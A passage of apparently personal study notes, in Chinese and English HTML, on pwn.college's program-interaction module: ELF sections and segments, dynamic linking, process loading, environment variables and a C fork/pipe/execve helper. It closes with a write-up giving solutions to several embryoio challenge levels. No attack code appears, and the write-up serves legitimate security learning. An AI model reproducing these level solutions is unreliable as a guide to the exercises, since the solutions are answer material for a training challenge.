/new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure><h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote><p>pwn.college的教程还是挺绝的, slide可以做为基础知识的详细参考资料. Binaryfiles的slide在<a href="https://docs.google.com/presentation/d/1wrX8tvwaxIEk5hx4OtQmPqps-MScIaDO-9bTKQqr8vI/edit#slide=id.g9265d66f8d_0_26">这里</a> </p><p><a href="https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">ELF base struct: header-sections-segments</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/">symbols</a><br><a href="https://www.intezer.com/blog/elf/executable-and-linkable-format-101-part-3-relocations/">relocations</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">dynamic-linking</a> </p></blockquote><ul><li>ELF is a binary file format.<br>  Contains the program and its data.Describes how the program should be loaded (<em>program/segment headers</em>).Contains metadata describing program components (<em>section headers</em>).</li><li><strong>sections</strong> gather all needed information to link a given object file and build an executable,<br>  while <strong>Program Headers</strong> split the executable into segments with different attributes, which will eventually be loaded into memory.</li><li>Section headers are <em><strong>not</strong></em> a necessary part of the ELF. <em>Section headers</em> are just <strong>metadata</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file /bin/cat</span> <br>/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e6afa43e1e280bd06c018f541c7ae46a2ebda83c, for GNU/Linux 3.2.0, stripped<br></code></pre></div></td></tr></table></figure><ul><li>Several ways to dig in: 在CSAPP里, 当初看的时候被我忽略掉了…<ul><li><input checked="" disabled="" type="checkbox"> <strong>gcc</strong> to make your ELF.</li><li><input checked="" disabled="" type="checkbox"> <strong>readelf</strong> to parse the ELF header.</li><li><input checked="" disabled="" type="checkbox"> <strong>objdump</strong> to parse the ELF header and disassemble the source code.</li><li><input checked="" disabled="" type="checkbox"> <strong>nm</strong> to view your ELF’s symbols.</li><li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some ELF properties.</li><li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li><li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li><li><input disabled="" type="checkbox"> <a href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a> to look through your ELF interactively</li></ul></li></ul><h3 id="ELF-base-struct"><a href="#ELF-base-struct" class="headerlink" title="ELF base struct"></a>ELF base struct</h3><p>ELF files are composed of three major components:</p><ul><li><strong>ELF Header</strong> : contains general information about the binary <code>readelf -h &lt;executable&gt;</code> </li><li><strong>Sections</strong> : comprise all information needed for linking a target object file in order to build a working executable <code>readelf -S &lt;executable&gt;</code></li><li><strong>Segments</strong> : break down the structure of an ELF binary into suitable chunks to prepare the executable to be loaded into memory</li></ul><blockquote><p>每个section的意义还是要注意一下, 我又倒回来看.got.plt了</p></blockquote><p>注意segment在链接的时候没有作用, section在运行时没有作用.</p><p>一方面Segment通过把section分组来提高装载的效率, 另一方面要注意必须和物理页大小对齐, 以便于pte中的权限控制.</p><h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><p><strong>Provide interface to Linkers and Debuggers to enforce their functionality.</strong> </p><p>.dynstr是.dynsym的string table, The section <em>.strtab</em> is the <em>String Table</em> of <em>.symtab Symbol Table</em>. 而且string table的entry数量和symbol table的entry数量一致.</p><p><img src="../../image/pwn-modules/photo_2018-01-13_11-28-32.jpg"></p><h3 id="relocation"><a href="#relocation" class="headerlink" title="relocation"></a>relocation</h3><ol><li><strong>Defining Relocations</strong> </li></ol><p>There are different types of <u>relocatable files</u>:</p><ul><li>Generic object files (*.o).     比较简单, 就是一个静态链接的文件.</li><li>Kernel object files (*.ko).     wait for future</li><li>Shared object files (*.so).    <ul><li>These type of relocatable files support being linked on runtime, and they may be shared across different processes. Consequently, relocations of dynamic dependencies have to be done at runtime. This process is known as Dynamic Linking.</li></ul></li></ul><p>Elfxx_Rel and Elfxx_Rela差在一个Addend上, 也就是要重定位的位置和下一条指令地址的差值<strong>取反</strong>.</p><p>其他的部分看原博客<a href="https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/">就行</a>, 东西太多必须每一段意思都要懂, 不过重定位条目比较少也容易记住.</p><h3 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h3><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>Unlike in static linking, <em><strong>ld</strong></em> requires shared libraries to create a dynamically linked executable.<br>The output file will contain the <strong>executable’s code</strong> and <strong>the names of the shared libraries</strong> required.</p><p>When the binary is executed, the dynamic linker will find the required dependencies to <strong>load</strong> and link them together.</p><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The dynamic linking process begins immediately after execution.</p><p>With dynamically linked programs, the system executes the file’s “<strong>interpreter</strong>”, which is an <u>intermediate</u> program that should <strong>set up the environment and only then execute the main binary</strong>. The interpreter lies in the <em>PT_INTERP</em> segment created by the compile-time linker (<em><strong>ld</strong></em>).</p><p>The dynamic linker will <strong>set up the environment</strong> <u>using dynamic entries</u> from the <em>.dynamic</em> section:</p><p>preparing the environment:</p><ol><li>Load the original file’s PT_LOAD segments in memory.</li><li>Use the <em>.dynamic</em> section/segment to read dependencies, search for them on disk and load them in memory as well. This is done recursively for dependent libraries—they can be dynamically linked as well. The dependency searching algorithm is outlined in the <a href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>.</li><li>Perform relocations – shared libraries are loaded into non-deterministic addresses and must have absolute addresses patched, as well as resolving references to other object files.</li><li>Invoke shared library initialization functions (registered in the <em>.preinit_array, .init, .init_array</em> sections). <strong>What happened?</strong> </li><li>Finally, pass control back to the original binary’s entry point, making it seem to the binary that control was passed directly from <em>exec</em>.</li></ol><p>还讲到了<strong>LD_PRELOAD</strong>和<strong>LD_LIBRARY_PATH</strong>变量…还是看原文吧…</p><h4 id="Lazy-Linking"><a href="#Lazy-Linking" class="headerlink" title="Lazy Linking"></a>Lazy Linking</h4><p>lazy linking的原因是如果一个程序开头出错了马上退出, rendering useless all of the relocation work performed by the dynamic linker, 所以将一些链接工作放到实际调用的时候.</p><p>在CSAPP中看过了, 基本相同, 不同在于提供了IDA的视图看法.</p><h2 id="Process-Loading"><a href="#Process-Loading" class="headerlink" title="Process Loading"></a>Process Loading</h2><ol><li><p>A process is created.</p><p> by fork() or clone() and execve().</p></li><li><p>Cat is loaded.</p><ul><li><p>must be executable</p><p>To figure out what to load, the Linux kernel reads the beginning of the file (i.e., /bin/cat), and makes a decision:</p></li><li><p>If the file starts with <strong>#!</strong>, the kernel extracts the interpreter from the rest of that line and executes this interpreter with the original file as an argument.</p></li><li><p>If the file matches a format in <strong>/proc/sys/fs/binfmt_misc</strong>, the kernel executes the interpreter specified for that format with the original file as an argument.</p></li><li><p>If the file is a <strong>dynamically-linked</strong> ELF, the kernel reads the interpreter/loader defined in the ELF, loads the interpreter and the original file, and lets the interpreter take control.</p></li><li><p>If the file is a <strong>statically-linked</strong> ELF, the kernel will load it.Other legacy file formats are checked for</p><p>notice the interpreter specified in .interp section.</p><p><strong>Dynamically linked ELFs: the loading process</strong> </p></li><li><p>The program and its interpreter are <u>loaded by the kernel</u>.</p></li><li><p>The interpreter <u>locates the libraries</u>.<br>  a. LD_PRELOAD environment variable, and anything in /etc/ld.so.preload<br>  b. LD_LIBRARY_PATH environment variable (can be set in the shell)<br>  c. DT_RUNPATH or DT_RPATH specified in the binary file (both can be modified with patchelf)<br>  d.system-wide configuration (/etc/ld.so.conf)<br>  e. /lib and /usr/lib</p></li><li><p>The interpreter <u>loads the libraries</u>.<br>  a.  these libraries can depend on other libraries, causing more to be loadedb.relocations updated</p></li></ul></li><li><p><a href="https://docs.google.com/presentation/d/1TwM5WLWnTqrNkpXjGKkaXYbKZEpatEQYA7ckBVXAOhs/edit#slide=id.g40953d030c_0_179">Cat is initialized</a>.</p><p> <strong>/proc/self/maps</strong> and <strong>attribute((constructor))</strong> </p></li></ol><p>Further readings:</p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How does the Linux kernel run a program</a> </p><p><a href="https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4">Linux: Understanding the Memory Layout of Linux Executables</a> </p><h2 id="Process-Execution"><a href="#Process-Execution" class="headerlink" title="Process Execution"></a>Process Execution</h2><p>用命令行演示了非常多的内容, 基本都没见过我尽量记录下一些细节. <a href="https://docs.google.com/presentation/d/1ezY9Q8I0tzDD-7ZDXMbQM5RQ7z1dvB9-U_nDEhc6qdE/edit#slide=id.g9279416eed_1_114">谷歌文档</a> </p><ol><li>Cat is launched.</li><li>Cat reads its arguments and environment.</li><li>Cat does its thing.</li><li>Cat terminates. </li></ol><p>上面四个是这一部分要考虑的流程, 我也按流程走:</p><h3 id="Cat-is-launched"><a href="#Cat-is-launched" class="headerlink" title="Cat is launched"></a>Cat is launched</h3><p><code>__libc_start_main()</code>, 又是这个函数, 不过在这之前还有一个<code>_start()</code>, 形成<code>_start()-&gt;__libc_start_main()-&gt;main()</code>流程.</p><blockquote><p>可以指定一下LD_PRELOAD参数来改变__libc_start_main()之类的操作</p></blockquote><h3 id="Cat-reads-arg-amp-env"><a href="#Cat-reads-arg-amp-env" class="headerlink" title="Cat reads arg &amp; env"></a>Cat reads arg &amp; env</h3><p>在下一节中有介绍, 视频里示范了一个改环境变量的例子.</p><p>在执行ls指令的时候 添加<code>LANG = C</code>环境变量, 会导致排序按照ASCII码, 否则会按照系统默认的<code>en_US-UTF-8</code> </p><h3 id="Cat-does-thing"><a href="#Cat-does-thing" class="headerlink" title="Cat does thing"></a>Cat does thing</h3><p>讲到了库函数, 系统调用, 信号, 共享内存. </p><p>通过nm指令来查看symbol, strace的使用, 以及libc库函数可以不用写头文件, 不过会引起一个隐式声明警告, 可以通过man来查看需要引用什么头文件. </p><p>信号演示的时候用了<code>ps pgrep</code>两个指令, 看ps的manual知道了参数有三种风格. 共享内存演示了/dev/shm, <strong>还不知道这怎么用</strong> </p><p>还有一个进程terminate, 和我在操作系统中看到的一致, 不重复了.</p><p>剩下的在PPT里.</p><h2 id="命令行参数和环境变量"><a href="#命令行参数和环境变量" class="headerlink" title="命令行参数和环境变量"></a>命令行参数和环境变量</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br></code></pre></div></td></tr></table></figure><p>main函数的参数, 其中argv和envp是字符串数组的指针, 所以是二重指针, 两个数组的最后一个元素是null.</p><p>就像这样子:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -o <span class="hljs-built_in">test</span> test.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./<span class="hljs-built_in">test</span> testing</span><br>The number of arguments is: 2<br><br>First arg:     The program name is: ./test<br>Second arg: The first argument is: testing<br><br>The first environment variable is: PWD=/home/yans # process working directory<br>The second environment variable is: SHLVL=1<br></code></pre></div></td></tr></table></figure><p><code>env</code> runs a command with a modified environment. 也可以设置特定的环境变量.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> env -i ./countenv</span>                   <br>There are 0 environment variables.<br></code></pre></div></td></tr></table></figure><h2 id="PIPE"><a href="#PIPE" class="headerlink" title="PIPE"></a>PIPE</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> &#123;</span><br>    <span class="hljs-keyword">int</span> pid;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdin</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdout</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stderr</span>;<br>&#125;;<br><span class="hljs-keyword">void</span> __close(<span class="hljs-keyword">int</span> fd) &#123;<br>    <span class="hljs-keyword">if</span> (close(fd) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not close pipe end&quot;</span> ); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mk_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fds[<span class="hljs-number">2</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(fds) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not create pipe&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mv_fd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dup2(fd1,  fd2) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not duplicate pipe end&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>    __close(fd1);<br>&#125;<br><br><span class="hljs-comment">// Start program at argv[0] with arguments argv.</span><br><span class="hljs-comment">// Set up new stdin, stdout and stderr.</span><br><span class="hljs-comment">// Puts references to new process and pipes into `p`.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">call</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* argv[], struct subprocess * p)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> child_in[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_out[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_err[<span class="hljs-number">2</span>];<br>    pipe(child_in); pipe(child_out); pipe(child_err);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        __close(<span class="hljs-number">0</span>); __close(<span class="hljs-number">1</span>); __close(<span class="hljs-number">2</span>);                                 <span class="hljs-comment">// __close parent pipes</span><br>        __close(child_in[<span class="hljs-number">1</span>]); __close(child_out[<span class="hljs-number">0</span>]); __close(child_err[<span class="hljs-number">0</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        mv_fd(child_in[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>); mv_fd(child_out[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); mv_fd(child_err[<span class="hljs-number">1</span>], <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">char</span>* envp[] = &#123; <span class="hljs-string">&quot;\0&quot;</span> &#125;;<br>        <span class="hljs-comment">//write(1,&quot;what the fuck&quot;, 30);</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;failure in exec&quot;</span>, <span class="hljs-number">30</span>) ;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        __close(child_in[<span class="hljs-number">0</span>]); __close(child_out[<span class="hljs-number">1</span>]); __close(child_err[<span class="hljs-number">1</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        p-&gt;pid = pid;<br>        p-&gt;<span class="hljs-built_in">stdin</span> = child_in[<span class="hljs-number">1</span>];   <span class="hljs-comment">// parent wants to write to subprocess child_in</span><br>        p-&gt;<span class="hljs-built_in">stdout</span> = child_out[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_out</span><br>        p-&gt;<span class="hljs-built_in">stderr</span> = child_err[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_err</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from parent process!\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-string">&quot;\0&quot;</span>&#125;;<br>    call(argv, &amp;proc);<br><span class="hljs-comment">//    mv_fd(STDIN_FILENO, proc.stdin);</span><br><span class="hljs-comment">//    mv_fd(STDOUT_FILENO, proc.stdout);</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">char</span> buf_[<span class="hljs-number">2048</span>];<br>    read(proc.<span class="hljs-built_in">stdout</span>, buf, <span class="hljs-number">2048</span>);<br>    read(proc.<span class="hljs-built_in">stderr</span>, buf_,<span class="hljs-number">2048</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf_);<br>    waitpid(proc.pid);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>真的是相当多, 见<a href="https://pwn.college/modules/interaction">这里</a> </p><p>有个<a href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet</a>比较特别, 应该能用上</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><blockquote><p>怎么会有一百多个, 也太离谱了</p></blockquote><p>基本连接方式: ssh</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -f pwnkey<br>cat pwnkey.pub #copy public key<br>ssh -i pwnkey hacker@dojo.pwn.college -v<br></code></pre></div></td></tr></table></figure><p>在/challenge/[对应文件]中, 直接执行即可</p><ul><li>从远程机器复制文件:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i pwnkey hacker@dojo.pwn.college:/challenge/checker.py ./<br></code></pre></div></td></tr></table></figure><h3 id="level-几来着"><a href="#level-几来着" class="headerlink" title="level(几来着)"></a>level(几来着)</h3><p>要求以0个环境变量运行程序, 可以使用execve函数, env命令, exec命令三种方法</p><blockquote><p>其余的大概就是加环境变量, 加参数, 写在脚本里之类的简单题</p></blockquote><h3 id="level15新东西"><a href="#level15新东西" class="headerlink" title="level15新东西"></a>level15新东西</h3><p>新的一个东西: ipython, An enhenced interactive python, 增加了一些特别的功能, 还有个说明书放在本level的末尾.</p><p>ssh接上后, 进入ipython, 然后Ctrl+O就可以编辑多行脚本了, 使用的还是pwntools, 算是熟悉一点.</p><p>有两种方法: </p><ol><li><code>!exec /challenge/embryoio_level15</code> </li><li>用<code>pwn.process()</code> </li></ol><h3 id="Python-–-An-enhanced-Interactive-Python"><a href="#Python-–-An-enhanced-Interactive-Python" class="headerlink" title="Python – An enhanced Interactive Python"></a>Python – An enhanced Interactive Python</h3><p>IPython offers a fully compatible replacement for the standard Python<br>interpreter, with convenient shell features, special commands, command<br>history mechanism and output results caching.</p><p>At your system command line, type ‘ipython -h’ to see the command line<br>options available. This document only describes interactive features.</p><h5 id="GETTING-HELP"><a href="#GETTING-HELP" class="headerlink" title="GETTING HELP"></a>GETTING HELP</h5><p>Within IPython you have various way to access help:</p><p>  <strong>?     -&gt; Introduction and overview of IPython’s features (this screen).</strong><br>  object?   -&gt; Details about ‘object’.<br>  object??  -&gt; More detailed, verbose information about ‘object’.<br>  %quickref -&gt; Quick reference of all IPython specific syntax and magics.<br>  help      -&gt; Access Python’s own help system.</p><p>If you are in terminal IPython you can quit this screen by pressing <code>q</code>.</p><h5 id="MAIN-FEATURES"><a href="#MAIN-FEATURES" class="headerlink" title="MAIN FEATURES"></a>MAIN FEATURES</h5><ul><li><p>Access to the standard Python help with object docstrings and the Python<br>  manuals. Simply type ‘help’ (no quotes) to invoke it.</p></li><li><p>Magic commands: type %magic for information on the magic subsystem.</p></li><li><p>System command aliases, via the %alias command or the configuration file(s).</p></li><li><p>Dynamic object information:</p><p>  Typing ?word or word? prints detailed information about an object. Certain<br>  long strings (code, etc.) get snipped in the center for brevity.</p><p>  Typing ??word or word?? gives access to the full information without<br>  snipping long strings. Strings that are longer than the screen are printed<br>  through the less pager.</p><p>  The ?/?? system gives access to the full source code for any object (if<br>  available), shows function prototypes and other useful information.</p><p>  If you just want to see an object’s docstring, type ‘%pdoc object’ (without<br>  quotes, and without % if you have automagic on).</p></li><li><p><strong>Tab completion in the local namespace:</strong> </p><p>  At any time, hitting tab will complete any available python commands or<br>  variable names, and show you a list of the possible completions if there’s<br>  no unambiguous one. It will also complete filenames in the current directory.</p></li><li><p><strong>Search previous command history in multiple ways:</strong> </p><ul><li><p>Start typing, and then use arrow keys up/down or (Ctrl-p/Ctrl-n) to search<br>  through the history items that match what you’ve typed so far.</p></li><li><p>Hit Ctrl-r: opens a search prompt. Begin typing and the system searches<br>  your history for lines that match what you’ve typed so far, completing as<br>  much as it can.</p></li><li><p>%hist: search history by index.</p></li></ul></li><li><p><strong>Persistent command history across sessions.</strong></p></li><li><p>Logging of input with the ability to save and restore a working session.</p></li><li><p><strong>System shell with !. Typing !ls will run ‘ls’ in the current directory.</strong></p></li><li><p>The reload command does a ‘deep’ reload of a module: changes made to the<br>  module since you imported will actually be available without having to exit.</p></li><li><p>Verbose and colored exception traceback printouts. See the magic xmode and<br>  xcolor functions for details (just type %magic).</p></li><li><p>Input caching system:</p><p>  IPython offers numbered prompts (In/Out) with input and output caching. All<br>  input is saved and can be retrieved as variables (besides the usual arrow<br>  key recall).</p><p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _i: stores previous input.<br>  _ii: next previous.<br>  _iii: next-next previous.<br>  _ih : a list of all input _ih[n] is the input from line n.</p><p>  Additionally, global variables named _i&lt;n&gt; are dynamically created (&lt;n&gt;<br>  being the prompt counter), such that _i&lt;n&gt; == _ih[&lt;n&gt;]</p><p>  For example, what you typed at prompt 14 is available as _i14 and _ih[14].</p><p>  You can create macros which contain multiple input lines from this history,<br>  for later re-execution, with the %macro function.</p><p>  The history function %hist allows you to see any part of your input history<br>  by printing a range of the _i variables. Note that inputs which contain<br>  magic functions (%) appear in the history with a prepended comment. This is<br>  because they aren’t really valid Python code, so you can’t exec them.</p></li><li><p>Output caching system:</p><p>  For output that is returned from actions, a system similar to the input<br>  cache exists but using _ instead of _i. Only actions that produce a result<br>  (NOT assignments, for example) are cached. If you are familiar with<br>  Mathematica, IPython’s _ variables behave exactly like Mathematica’s %<br>   variables.</p><p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _ (one underscore): previous output.<br>  __ (two underscores): next previous.<br>  ___ (three underscores): next-next previous.</p><p>  Global variables named _<n> are dynamically created (<n> being the prompt<br>  counter), such that the result of output <n> is always available as _<n>.</p><p>  Finally, a global dictionary named _oh exists with entries for all lines<br>  which generated output.</p></li><li><p><strong><mark>Directory history:</mark></strong> </p><p>  <strong>Your history of visited directories is kept in the global list _dh, and the</strong><br>  <strong>magic %cd command can be used to go to any entry in that list.</strong> </p></li><li><p>Auto-parentheses and auto-quotes (adapted from Nathan Gray’s LazyPython)</p><ol><li><p>Auto-parentheses</p><p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p><div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3</code></pre></div><p> and the input will be translated to this::</p><div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)</code></pre></div><p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p><p> You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;</code></pre></div><p> Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::</p><div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error</code></pre></div><p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p><div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work</code></pre></div><p> but this will work::</p><div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6) ------&gt; zip ((1,2,3),(4,5,6)) Out[2]= [(1, 4), (2, 5), (3, 6)]</code></pre></div><p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::</p><div class="hljs code-wrapper"><pre><code> In [18]: callable list -------&gt; callable (list)</code></pre></div></li><li><p><mark>Auto-Quoting</mark> </p><p> You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)</code></pre></div><p> If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::</p><div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)  In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)</code></pre></div><p> Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::</p><div class="hljs 